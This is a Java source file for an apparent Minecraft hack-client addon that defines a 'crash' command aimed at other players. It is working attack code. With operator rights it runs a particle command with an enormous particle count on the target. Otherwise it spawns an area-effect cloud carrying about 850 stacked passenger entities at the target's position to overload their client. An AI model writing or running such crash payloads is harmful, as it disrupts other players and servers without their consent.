package uwu.taxevasion.allahhack.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.systems.commands.Command;
import meteordevelopment.meteorclient.systems.commands.arguments.PlayerArgumentType;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class CrashCommand extends Command {
    public CrashCommand() {
        super("crash", "crashes a player (needs op)", "crash", "ripbozo");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(argument("player", PlayerArgumentType.player()).executes(context -> {
            if (mc.player.hasPermissionLevel(4)) {
                mc.player.sendChatMessage("/execute as " + PlayerArgumentType.getPlayer(context).getEntityName() + " run particle explosion ~ ~ ~ 1 1 1 0.01 1333333337 force @s");
            } else {
                ItemStack sex = new ItemStack(Items.SALMON_SPAWN_EGG);
                ItemStack owo = mc.player.getMainHandStack();
                BlockHitResult bhr = new BlockHitResult(mc.player.getPos(), Direction.DOWN, new BlockPos(mc.player.getPos()), false);
                String balls = ",{id:\"minecraft:area_effect_cloud\",Particle:explosion,Duration:200,Radius:50}";
                sex.setNbt(StringNbtReader.parse("{EntityTag:{id:\"minecraft:area_effect_cloud\",Pos:[" + PlayerArgumentType.getPlayer(context).getPos().x + "," + PlayerArgumentType.getPlayer(context).getPos().y + "," + PlayerArgumentType.getPlayer(context).getPos().z + "],Particle:explosion,Duration:200,Radius:50,Passengers:[{id:\"minecraft:area_effect_cloud\",Particle:explosion,Duration:200,Radius:50}" + balls.repeat(850) + "]}}"));
                mc.interactionManager.clickCreativeStack(sex, 36 + mc.player.getInventory().selectedSlot);
                mc.interactionManager.interactBlock(mc.player, Hand.MAIN_HAND, bhr);
                mc.interactionManager.clickCreativeStack(owo, 36 + mc.player.getInventory().selectedSlot);
            }
            return SINGLE_SUCCESS;
        }));
    }
}
